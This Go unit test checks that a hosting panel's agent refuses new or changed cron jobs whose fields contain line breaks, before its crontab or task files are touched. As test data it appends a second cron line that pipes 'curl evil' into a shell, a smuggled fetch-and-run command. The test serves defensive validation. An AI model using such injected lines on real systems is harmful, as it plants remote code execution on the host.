package main

import (
	"errors"
	"testing"
)

// TestATaskWithALineBreakTouchesNothing (alpha.150 lab W2): the Agent's own
// refusal of a field with a line break comes before its store is decided,
// read or written (crontab, task file, unit files), for a new and a changed
// task; its words are the ones the panel answers with CRON_TASK_LINE_BREAK
// (cmd/panel/domain_cron_errors.go agentRefusedCronLineBreak).
func TestATaskWithALineBreakTouchesNothing(t *testing.T) {
	touched := errors.New("the store was touched")
	store := cronStore{
		resolve: func() (cronStore, error) { t.Error("resolved"); return cronStore{}, touched },
		read:    func() (string, error) { t.Error("read"); return "", touched },
		write:   func(string, string, []string) error { t.Error("written"); return touched },
	}
	for _, field := range []string{"schedule", "command", "comment"} {
		for _, brk := range []string{"\n", "\r", "\x00"} {
			fields := map[string]string{"schedule": "0 3 * * *", "command": "/usr/bin/backup", "comment": "nightly"}
			fields[field] += brk + "* * * * * /bin/sh -c 'curl evil|sh'"
			want := "cron " + field + " must not contain line breaks"
			add := addCronJobIn(store, "site_user", &AddCronJobRequest{Schedule: fields["schedule"], Command: fields["command"], Comment: fields["comment"], Version: "v"})
			change := updateCronJobIn(store, "site_user", &UpdateCronJobRequest{ID: "x", Schedule: fields["schedule"], Command: fields["command"], Comment: fields["comment"], Version: "v"})
			for name, err := range map[string]error{"add": add, "change": change} {
				if err == nil || err.Error() != want {
					t.Fatalf("%s %s %q: %v", name, field, brk, err)
				}
			}
		}
	}
}
